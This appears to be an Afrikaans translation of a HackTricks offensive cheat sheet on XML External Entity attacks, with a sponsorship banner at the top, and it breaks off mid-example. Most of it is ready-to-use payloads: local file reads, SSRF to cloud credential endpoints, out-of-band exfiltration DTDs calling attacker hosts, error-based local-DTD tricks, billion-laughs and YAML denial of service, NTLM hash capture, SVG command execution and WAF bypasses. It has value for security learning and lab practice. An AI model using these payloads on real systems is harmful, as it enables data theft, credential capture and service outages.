# XXE - XEE - Eksterne Entiteit van XML

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>


## XML Basiese beginsels

XML is 'n merktaal wat ontwerp is vir data-opberging en -vervoer, met 'n buigsame struktuur wat die gebruik van beskrywende benoemde etikette moontlik maak. Dit verskil van HTML deur nie beperk te wees tot 'n stel voorgedefinieerde etikette nie. XML se betekenis het afgeneem met die opkoms van JSON, ten spyte van sy aanvanklike rol in AJAX-tegnologie.

- **Data-voorstelling deur Entiteite**: Entiteite in XML maak die voorstelling van data moontlik, insluitend spesiale karakters soos `&lt;` en `&gt;`, wat ooreenstem met `<` en `>` om konflik met XML se etiketsisteem te voorkom.

- **Definisie van XML-elemente**: XML maak die definisie van elementtipes moontlik, waarin uitgelê word hoe elemente gestruktureer moet word en watter inhoud hulle kan bevat, van enige tipe inhoud tot spesifieke kinder-elemente.

- **Dokumenttipe-definisie (DTD)**: DTD's is noodsaaklik in XML om die struktuur van die dokument en die tipes data wat dit kan bevat, te definieer. Hulle kan intern, ekstern of 'n kombinasie wees, en rig die formaat en geldigheid van dokumente.

- **Aangepaste en Eksterne Entiteite**: XML ondersteun die skep van aangepaste entiteite binne 'n DTD vir buigsame data-voorstelling. Eksterne entiteite, wat gedefinieer word met 'n URL, veroorsaak sekuriteitskwessies, veral in die konteks van XML Eksterne Entiteit (XXE) aanvalle, wat die manier waarop XML-parserse eksterne data-bronne hanteer, uitbuit: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`

- **XXE-opsporing met Parameter Entiteite**: Vir die opsporing van XXE-kwesbaarhede, veral wanneer konvensionele metodes faal as gevolg van parser-sekuriteitsmaatreëls, kan XML-parameter-entiteite gebruik word. Hierdie entiteite maak out-of-band opsporingstegnieke moontlik, soos die veroorsaak van DNS-opsoekings of HTTP-versoeke na 'n beheerde domein, om die kwesbaarheid te bevestig.
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`


## Hoofaanvalle

**[Die meeste van hierdie aanvalle is getoets met die fantastiese Portswiggers XEE-laboratoriums: https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)**

### Nuwe Entiteitstoets

In hierdie aanval gaan ek toets of 'n eenvoudige nuwe ENTITEIT-verklaring werk.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../.gitbook/assets/image (220).png>)

### Lees lêer

Laten ons probeer om `/etc/passwd` op verskillende maniere te lees. Vir Windows kan jy probeer om te lees: `C:\windows\system32\drivers\etc\hosts`

In hierdie eerste geval, let daarop dat SYSTEM "_\*\*file:///\*\*etc/passwd_" ook sal werk.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (221).png>)

Hierdie tweede geval moet nuttig wees om 'n lêer uit te trek as die webbediener PHP gebruik (nie die geval met Portswiggers-laboratoriums nie)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
In hierdie derde geval merk ons op dat ons die `Element stockCheck` as ENIGE verklaar.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (222) (1).png>)

### Lys van gids

In **Java**-gebaseerde toepassings is dit moontlik om die inhoud van 'n gids te lys deur middel van XXE met 'n payload soos (net vra vir die gids in plaas van die lêer):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

'n XXE kan gebruik word om 'n SSRF binne 'n wolk te misbruik.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blinde SSRF

Deur die **voorheen gekommenteerde tegniek** te gebruik, kan jy die bediener dwing om 'n bediener wat jy beheer, te benader om te wys dat dit kwesbaar is. Maar as dit nie werk nie, is dit dalk omdat **XML-entiteite nie toegelaat word nie**, in daardie geval kan jy probeer om **XML-parameterentiteite** te gebruik:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Blind" SSRF - Uitlek van data buite-band

**In hierdie geval gaan ons die bediener 'n nuwe DTD laat laai met 'n skadelike lading wat die inhoud van 'n lêer via 'n HTTP-versoek sal stuur (vir meerrigtinglêers kan jy probeer om dit uit te lek via** _**ftp://**_**). Hierdie verduideliking is gebaseer op** [**Portswiggers-laboratorium hier**](https://portswigger.net/web-security/xxe/blind)**.**

In die gegee skadelike DTD word 'n reeks stappe uitgevoer om data uit te lek:

### Voorbeeld van skadelike DTD:
Die struktuur is as volg:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Die stappe wat deur hierdie DTD uitgevoer word, sluit in:

1. **Definisie van Parameter Entiteite:**
- 'n XML-parameterentiteit, `%file`, word geskep wat die inhoud van die `/etc/hostname`-lêer lees.
- 'n Ander XML-parameterentiteit, `%eval`, word gedefinieer. Dit verklaar dinamies 'n nuwe XML-parameterentiteit, `%exfiltrate`. Die `%exfiltrate`-entiteit word ingestel om 'n HTTP-versoek na die aanvaller se bediener te maak, waarby die inhoud van die `%file`-entiteit binne die vraagstring van die URL oorgedra word.

2. **Uitvoering van Entiteite:**
- Die `%eval`-entiteit word gebruik, wat lei tot die uitvoering van die dinamiese verklaring van die `%exfiltrate`-entiteit.
- Die `%exfiltrate`-entiteit word dan gebruik, wat 'n HTTP-versoek na die gespesifiseerde URL met die lêer se inhoud veroorsaak.

Die aanvaller bied hierdie skadelike DTD aan op 'n bediener onder hul beheer, tipies by 'n URL soos `http://web-attacker.com/malicious.dtd`.

**XXE-lading:**
Om 'n kwesbare toepassing uit te buit, stuur die aanvaller 'n XXE-lading:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Hierdie payload definieer 'n XML-parameterentiteit `%xxe` en inkorporeer dit binne die DTD. Wanneer dit deur 'n XML-parser verwerk word, haal hierdie payload die eksterne DTD van die aanvaller se bediener af. Die parser interpreteer dan die DTD inline en voer die stappe uit wat in die skadelike DTD uitgelê is, wat lei tot die uitlek van die `/etc/hostname`-lêer na die aanvaller se bediener.


### Foutgebaseerd (Eksterne DTD)

**In hierdie geval gaan ons die bediener 'n skadelike DTD laat laai wat die inhoud van 'n lêer binne 'n foutboodskap wys (dit is slegs geldig as jy foutboodskappe kan sien).** [**Voorbeeld van hier.**](https://portswigger.net/web-security/xxe/blind)

'n XML-analise-foutboodskap wat die inhoud van die `/etc/passwd`-lêer onthul, kan geaktiveer word deur 'n skadelike eksterne Document Type Definition (DTD) te gebruik. Dit word bereik deur die volgende stappe te volg:

1. 'n XML-parameterentiteit met die naam `file` word gedefinieer, wat die inhoud van die `/etc/passwd`-lêer bevat.
2. 'n XML-parameterentiteit met die naam `eval` word gedefinieer, wat 'n dinamiese verklaring vir 'n ander XML-parameterentiteit met die naam `error` inkorporeer. Hierdie `error`-entiteit, wanneer dit geëvalueer word, probeer om 'n nie-bestaande lêer te laai, waarby die inhoud van die `file`-entiteit as sy naam ingesluit word.
3. Die `eval`-entiteit word aangeroep, wat lei tot die dinamiese verklaring van die `error`-entiteit.
4. Die aanroeping van die `error`-entiteit lei tot 'n poging om 'n nie-bestaande lêer te laai, wat 'n foutboodskap veroorsaak wat die inhoud van die `/etc/passwd`-lêer as deel van die lêernaam insluit.

Die skadelike eksterne DTD kan geaktiveer word met die volgende XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
By uitvoering moet die webbediener se reaksie 'n foutboodskap insluit wat die inhoud van die `/etc/passwd`-lêer vertoon.

![](<../.gitbook/assets/image (223) (1).png>)

_**Let daarop dat 'n eksterne DTD ons toelaat om een entiteit binne die tweede (****`eval`****) in te sluit, maar dit is verbied in die interne DTD. Daarom kan jy nie 'n fout afdwing sonder om 'n eksterne DTD te gebruik (gewoonlik).**_

### **Foutgebaseerd (sisteem DTD)**

Wat van blinde XXE-gebreklikhede wanneer **out-of-band-interaksies geblokkeer word** (eksterne verbindings is nie beskikbaar nie)?

'n Oorweging in die XML-taal spesifikasie kan **gevoelige data blootstel deur foutboodskappe wanneer 'n dokument se DTD interne en eksterne verklarings meng**. Hierdie probleem maak die interne herdefiniëring van entiteite wat eksterne verklarings gemaak het, moontlik en fasiliteer die uitvoering van foutgebaseerde XXE-aanvalle. Sulke aanvalle maak gebruik van die herdefiniëring van 'n XML-parameterentiteit, oorspronklik verklaar in 'n eksterne DTD, van binne 'n interne DTD. Wanneer out-of-band-verbindings deur die bediener geblokkeer word, moet aanvallers staatmaak op plaaslike DTD-lêers om die aanval uit te voer, met die doel om 'n parsingsfout te veroorsaak om gevoelige inligting bloot te stel.

Beskou 'n scenario waar die bediener se lêersisteem 'n DTD-lêer bevat by `/usr/local/app/schema.dtd`, wat 'n entiteit met die naam `custom_entity` definieer. 'n Aanvaller kan 'n XML-parsingsfout veroorsaak wat die inhoud van die `/etc/passwd`-lêer blootstel deur 'n hibriede DTD soos volg in te dien:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Die uitgeligte stappe word uitgevoer deur hierdie DTD:

- Die definisie van 'n XML-parameterentiteit genaamd `local_dtd` sluit die eksterne DTD-lêer in wat op die bediener se lêersisteem geleë is.
- 'n Herdefinisie vind plaas vir die `custom_entity` XML-parameterentiteit, oorspronklik gedefinieer in die eksterne DTD, om 'n [foutgebaseerde XXE-uitbuiting](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) in te sluit. Hierdie herdefinisie is ontwerp om 'n parsingsfout te veroorsaak, wat die inhoud van die `/etc/passwd`-lêer blootstel.
- Deur die gebruik van die `local_dtd`-entiteit, word die eksterne DTD betrokke, wat die nuut gedefinieerde `custom_entity` insluit. Hierdie reeks van aksies veroorsaak die uitstraling van die foutboodskap wat deur die uitbuiting beoog word.


**Werklike wêreld voorbeeld:** Stelsels wat die GNOME-blaai-omgewing gebruik, het dikwels 'n DTD by `/usr/share/yelp/dtd/docbookx.dtd` wat 'n entiteit genaamd `ISOamso` bevat.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

Aangesien hierdie tegniek 'n **interne DTD gebruik, moet jy eers 'n geldige een vind**. Jy kan dit doen deur dieselfde **OS / sagteware** as die bediener te **installeer** en te **soek na sommige verstek DTD's**, of deur 'n lys van **verstek DTD's** in stelsels te **kry** en te **kontroleer** of enige van hulle bestaan:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Vir meer inligting, besoek [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Opsoek na DTD's binne die stelsel

In die volgende fantastiese github-opberging kan jy **paaie van DTD's wat in die stelsel teenwoordig kan wees**, vind:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Verder, as jy die **Docker-beeld van die slagofferstelsel** het, kan jy die hulpmiddel van dieselfde opberging gebruik om die **beeld** te **deursoek** en die paaie van **DTD's** wat in die stelsel teenwoordig is, te **vind**. Lees die [Leesmy van die github](https://github.com/GoSecure/dtd-finder) om te leer hoe.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE via Office Open XML Parsers

Vir 'n meer diepgaande verduideliking van hierdie aanval, **kyk na die tweede gedeelte van [hierdie fantastiese pos](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) van Detectify**.

Die vermoë om **Microsoft Office-dokumente op te laai word deur baie webtoepassings aangebied**, wat dan voortgaan om sekere besonderhede uit hierdie dokumente te onttrek. Byvoorbeeld, 'n webtoepassing mag gebruikers toelaat om data in te voer deur 'n XLSX-formaat sigblad op te laai. Ten einde die parser in staat te stel om die data uit die sigblad te onttrek, sal dit noodwendig ten minste een XML-lêer moet ontleden.

Om vir hierdie kwesbaarheid te toets, is dit nodig om 'n **Microsoft Office-lêer te skep wat 'n XXE-payload bevat**. Die eerste stap is om 'n leë gids te skep waarin die dokument uitgepakte kan word.

Nadat die dokument uitgepakte is, moet die XML-lêer wat by `./unzipped/word/document.xml` geleë is, in 'n voorkeur teksredigeerder (soos vim) geopen en gewysig word. Die XML moet aangepas word om die gewenste XXE-payload in te sluit, dikwels beginnend met 'n HTTP-versoek.

Die gewysigde XML-lyne moet tussen die twee hoof XML-voorwerpe ingevoeg word. Dit is belangrik om die URL met 'n monitorbare URL vir versoek te vervang.

Laastens kan die lêer saamgepers word om die skadelike poc.docx-lêer te skep. Vanuit die vorige geskepte "uitgepakte" gids moet die volgende bevel uitgevoer word:

Nou kan die geskepte lêer na die potensieel kwesbare webtoepassing opgelaai word, en daar kan gehoop word dat 'n versoek in die Burp Collaborator-logboeke verskyn.


### Jar: protokol

Die **jar**-protokol is slegs toeganklik binne **Java-toepassings**. Dit is ontwerp om lêertoegang binne 'n **PKZIP**-argief (bv. `.zip`, `.jar`, ens.) moontlik te maak, en voorsien in beide plaaslike en afgeleë lêers.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Om toegang te hê tot lêers binne PKZIP-lêers is **baie nuttig om XXE te misbruik deur middel van stelsel DTD-lêers.** Kyk [hierdie afdeling om te leer hoe om stelsel DTD-lêers te misbruik](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

Die proses agter die toegang tot 'n lêer binne 'n PKZIP-argief via die jar-protokol behels verskeie stappe:

1. 'n HTTP-versoek word gemaak om die zip-argief van 'n gespesifiseerde plek af te laai, soos `https://download.website.com/archive.zip`.
2. Die HTTP-antwoord wat die argief bevat, word tydelik op die stelsel gestoor, tipies op 'n plek soos `/tmp/...`.
3. Die argief word dan uitgepakte om toegang tot sy inhoud te verkry.
4. Die spesifieke lêer binne die argief, `file.zip`, word gelees.
5. Na die operasie word enige tydelike lêers wat gedurende hierdie proses geskep is, uitgevee.

'n Interessante tegniek om hierdie proses by die tweede stap te onderbreek, behels om die bedienersverbinding onbeperk oop te hou terwyl die argief-lêer bedien word. Gereedskap beskikbaar by [hierdie bewaarplek](https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution) kan vir hierdie doel gebruik word, insluitend 'n Python-bedieners (`slow_http_server.py`) en 'n Java-bedieners (`slowserver.jar`).
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
Die skryf van lêers in 'n tydelike gids kan help om 'n ander kwesbaarheid te verhoog wat 'n padtraversie behels (soos plaaslike lêer insluiting, sjabloon inspuiting, XSLT RCE, deserialisering, ens.).
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Biljoen Lag Attack

Die Biljoen Lag Aanval is 'n tipe DoS (Denial of Service) aanval wat gebruik maak van 'n spesifieke XML-eksploit genaamd "Biljoen Lag". Hierdie aanval maak gebruik van 'n XML-eksterne entiteit (XXE) om 'n groot aantal entiteite te skep wat die verwerking van XML-dokumente oorweldig.

Die aanval werk deur 'n kwaadwillige XML-dokument te stuur wat 'n entiteit bevat wat na 'n ander entiteit verwys. Hierdie proses word herhaallik herhaal, waarby elke entiteit na 'n ander entiteit verwys, wat uiteindelik lei tot 'n oorlading van die verwerkingstyd van die XML-dokument.

Die naam "Biljoen Lag" kom van die feit dat die aanval 'n kettingreaksie van entiteite skep, wat uiteindelik 'n biljoen entiteite kan wees. Hierdie oorlading van entiteite veroorsaak dat die doelwit se hulpbronne uitgeput raak en die diens nie meer beskikbaar is vir legitieme gebruikers nie.

Om die Biljoen Lag Aanval te voorkom, moet toepassings behoorlike XML-verwerkingstoestande hê en die gebruik van eksterne entiteite beperk. Dit kan gedoen word deur die verwydering van eksterne entiteite of deur die gebruik van 'n veilige XML-parser wat die verwerking van eksterne entiteite verhoed.

Dit is belangrik vir ontwikkelaars en beveiligingspersoneel om bewus te wees van hierdie aanvalstegniek en om toepassings te beskerm teen Biljoen Lag en ander XXE-gebaseerde aanvalle.
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml Aanval

YAML (YAML Ain't Markup Language) is 'n mensleesbare data-serialiseringsformaat wat dikwels gebruik word in konfigurasiebestande. Dit kan egter ook 'n potensiële aanvalsvlak wees as dit nie behoorlik gehanteer word nie. 'n YAML-aanval kan plaasvind wanneer 'n aanvaller 'n kwaadwillige YAML-lêer indien wat gebruik maak van spesiale YAML-funksies om 'n aanval uit te voer.

Hier is 'n paar algemene YAML-aanvalstegnieke:

##### 1. Insluiting van ander lêers

In hierdie aanvalstegniek probeer die aanvaller 'n ander YAML-lêer insluit deur gebruik te maak van die `!include`-funksie. As die toepassing nie behoorlik gevalideer en beperk word nie, kan dit lei tot die insluiting van gevoelige lêers wat die aanvaller toegang tot vertroulike inligting gee.

##### 2. Uitvoering van kode

Die aanvaller kan probeer om kwaadwillige kode uit te voer deur gebruik te maak van die `!exec`-funksie. As die toepassing nie behoorlik beperk word nie, kan dit lei tot die uitvoering van arbitrêre kode op die bedoelde stelsel.

##### 3. Oorbelasting van geheue

Hierdie aanvalstegniek behels die gebruik van 'n groot hoeveelheid data in die YAML-lêer om die toepassing se geheue te oorbelas. Dit kan lei tot 'n diensonderbreking of selfs 'n verlaagde stelselvermoë.

Om YAML-aanvalle te voorkom, moet die volgende maatreëls in ag geneem word:

- Behoorlike validering en beperking van die ingevoerde YAML-lêer.
- Beperking van die gebruik van gevaarlike YAML-funksies soos `!include` en `!exec`.
- Implementering van 'n veilige YAML-verwerker wat slegs toegang tot toegelate hulpbronne toelaat.
- Beperking van die geheueverbruik deur die toepassing van limiete op die grootte van die ingevoerde YAML-lêer.

Deur hierdie maatreëls te volg, kan die risiko van YAML-aanvalle verminder word en die veiligheid van die toepassing verhoog word.
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Kwadratiese Uitbreidingsaanval

![](<../.gitbook/assets/image (531).png>)

#### Kry NTML

Op Windows-gashere is dit moontlik om die NTML-hash van die webbedienergebruiker te kry deur 'n responder.py-handler in te stel:
```bash
Responder.py -I eth0 -v
```
en deur die volgende versoek te stuur
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
Dan kan jy probeer om die hash te kraak met behulp van hashcat

## Versteekte XXE Oppervlaktes

### XInclude

Wanneer kliëntdata in serverkant XML-dokumente geïntegreer word, soos dié in agterkant SOAP-versoeke, is direkte beheer oor die XML-struktuur dikwels beperk, wat tradisionele XXE-aanvalle belemmer as gevolg van beperkings op die wysiging van die `DOCTYPE`-element. 'n `XInclude`-aanval bied egter 'n oplossing deur die invoeging van eksterne entiteite binne enige data-element van die XML-dokument toe te laat. Hierdie metode is doeltreffend selfs wanneer slegs 'n gedeelte van die data binne 'n server-gegenereerde XML-dokument beheer kan word.

Om 'n `XInclude`-aanval uit te voer, moet die `XInclude`-naamruimte verklaar word en die lêerpad vir die bedoelde eksterne entiteit gespesifiseer word. Hieronder is 'n bondige voorbeeld van hoe so 'n aanval geformuleer kan word:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Kyk [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) vir meer inligting!

### SVG - Lêeroplaai

Lêers wat deur gebruikers na sekere toepassings opgelaai word en dan op die bediener verwerk word, kan kwesbaarhede uitbuit in hoe XML- of XML-bevattende lêerformate hanteer word. Gewone lêerformate soos kantoor dokumente (DOCX) en beelde (SVG) is gebaseer op XML.

Wanneer gebruikers **beeldmateriaal oplaai**, word hierdie beelde aan die bedienerkant verwerk of geverifieer. Selfs vir toepassings wat formate soos PNG of JPEG verwag, kan die **bediener se beeldverwerkingsbiblioteek ook SVG-beelde ondersteun**. SVG, as 'n op XML-gebaseerde formaat, kan deur aanvallers uitgebuit word om kwaadwillige SVG-beelde in te dien, wat die bediener blootstel aan XXE (XML External Entity) kwesbaarhede.

'n Voorbeeld van so 'n aanval word hieronder getoon, waar 'n kwaadwillige SVG-beeld probeer om stelsel lêers te lees:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
'n Ander metode behels 'n poging om **opdragte uit te voer** deur die PHP "expect" omhulsel:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
In beide gevalle word die SVG-formaat gebruik om aanvalle te lanceer wat die XML-verwerkingseienskappe van die bediener se sagteware uitbuit, wat die noodsaaklikheid van robuuste insetvalidering en sekuriteitsmaatreëls beklemtoon.

Kyk [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) vir meer inligting!

**Let op dat die eerste lyn van die geleesde lêer of die resultaat van die uitvoering BINNE die geskepte prent sal verskyn. Jy moet dus toegang hê tot die prent wat SVG geskep het.**

### **PDF - Lêer oplaai**

Lees die volgende berig om te leer hoe om 'n XXE te misbruik deur 'n PDF-lêer op te laai:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: Van x-www-urlencoded na XML

As 'n POST-versoek die data in XML-formaat aanvaar, kan jy probeer om 'n XXE in daardie versoek te misbruik. Byvoorbeeld, as 'n normale versoek die volgende bevat:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Dan kan jy dalk die volgende versoek indien, met dieselfde resultaat:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Inhoudstipe: Van JSON na XEE

Om die versoek te verander, kan jy 'n Burp-uitbreiding genaamd "**Inhoudstipe-omsetter**" gebruik. [Hier](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) kan jy hierdie voorbeeld vind:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
'n Ander voorbeeld kan hier gevind word [hier](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## WAF & Beskermingsoorbruggings

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Dit werk slegs as die XML-bediener die `data://`-protokol aanvaar.

### UTF-7

Jy kan die \[**"Encode Recipe**" van cyberchef hier ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) omskakel na UTF-7.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
